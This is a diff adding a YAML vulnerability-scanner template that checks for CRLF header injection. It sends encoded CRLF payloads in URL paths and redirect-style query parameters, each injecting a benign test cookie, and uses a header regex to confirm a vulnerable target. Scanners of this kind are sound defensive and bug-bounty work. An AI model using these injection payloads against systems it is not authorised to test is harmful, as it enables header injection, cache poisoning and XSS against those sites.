@@ -1,0 +1,40 @@
+id: bb-crlf-injection
+
+info:
+  name: CRLF Injection — Header Injection
+  author: guan4tou2
+  severity: medium
+  description: |
+    CRLF injection via URL path or query parameter allows injecting arbitrary
+    HTTP headers. Exploitable for XSS (Set-Cookie injection), cache poisoning,
+    and HTTP response splitting.
+  tags: bb-recon,crlf,injection,header
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/%0d%0aSet-Cookie:bb_crlf_test=1"
+      - "{{BaseURL}}/%0aSet-Cookie:bb_crlf_test=1"
+      - "{{BaseURL}}/%E5%98%8D%E5%98%8ASet-Cookie:bb_crlf_test=1"
+      - "{{BaseURL}}/%0d%0a%20Set-Cookie:bb_crlf_test=1"
+      - "{{BaseURL}}/?redirect=%0d%0aSet-Cookie:bb_crlf_test=1"
+      - "{{BaseURL}}/?url=%0d%0aSet-Cookie:bb_crlf_test=1"
+      - "{{BaseURL}}/?next=%0d%0aSet-Cookie:bb_crlf_test=1"
+      - "{{BaseURL}}/?return=%0d%0aSet-Cookie:bb_crlf_test=1"
+      - "{{BaseURL}}/?r=%0d%0aSet-Cookie:bb_crlf_test=1"
+      - "{{BaseURL}}/?lang=%0d%0aSet-Cookie:bb_crlf_test=1"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "(?i)Set-Cookie:\\s*bb_crlf_test"
+        part: header
+
+      - type: status
+        status:
+          - 200
+          - 301
+          - 302
+          - 307
+          - 308
